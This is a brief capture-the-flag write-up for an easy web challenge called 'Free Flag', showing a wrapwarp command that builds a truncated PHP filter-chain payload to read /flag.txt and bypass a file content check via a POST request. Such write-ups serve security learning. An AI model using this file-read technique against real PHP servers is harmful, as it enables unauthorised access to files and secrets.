# Free Flag Writeup

- **Category:** Web
- **Points:** 110
- **Difficulty:** Easy

## Challenge Description

Free Free

## Challenge Files

You can find the challenge files [here](https://github.com/hanzalaghayasabbasi/BlackHat-MEA-2024-Qualifiers-Write-Ups/tree/main/FreeFlag-src).

## Exploiting

To bypass the file content check, a malicious payload can be crafted using the `wrapwarp` tool. The following command generates the payload:

```bash
python3 wrapwarp.py /flag.txt "<?php" "?>" 100

Generated Payload:

php://filter/convert.base64-encode|convert.base64-encode|convert.iconv.855.UTF7|convert.base64-encode|convert.iconv.855.UTF7|convert.base64-……………………….........
```
## Get Flag
Once the payload is generated, it is transmitted via a POST request. This payload enables the retrieval of the flag by embedding it between <?php and ?>, thereby circumventing the file content check.

![image](https://github.com/user-attachments/assets/68a070bf-cf4d-46e7-825c-ed04690981e8)
